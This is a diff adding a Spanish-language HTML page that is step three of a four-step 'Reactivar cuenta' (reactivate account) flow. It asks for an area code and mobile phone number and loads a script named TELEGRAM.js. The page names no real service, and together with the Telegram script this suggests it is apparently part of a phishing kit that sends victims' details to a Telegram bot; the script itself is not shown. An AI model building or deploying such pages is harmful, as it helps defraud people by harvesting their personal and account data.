@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="shortcut icon" href="img/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/code-page.css">
+    <title>Ingreso de Número de Teléfono</title>
+</head>
+<body>
+    <header class="header"></header>
+    <div class="steps-container">
+        <h2>Reactivar cuenta</h2>
+        <div class="steps-indicator">
+            <div class="step active"></div>
+            <div class="step active"></div>
+            <div class="step active"></div>
+            <div class="step"></div>
+
+        </div>
+    </div>
+    <div class="form-container">
+        <h3>Ingresa tu número </h3>
+
+        <form id="phoneForm" method="post">
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <label for="areaCode">Código de Área</label>
+                    <input type="tel" id="areaCode" maxlength="4" oninput="allowOnlyNumbers(this)">
+                </div>
+                <div class="input-wrapper">
+                    <label for="phoneNumber">Número de Celular</label>
+                    <input type="tel" id="phoneNumber" maxlength="10" oninput="allowOnlyNumbers(this)">
+                </div>
+            </div>
+            <div class="button-group">
+                <button type="submit" class="continue-btn" disabled>Continuar</button>
+                <button type="button" class="cancel-btn">Cancelar</button>
+            </div>
+        </form>
+    </div>
+    <script src="TELEGRAM.js"></script> 
+    <script src="js/script4.js"></script>
+    <script src="js/allowOnlyNumbers.js"></script>
+    <script src="js/phone-validate.js"></script>
+</body>
+</html>
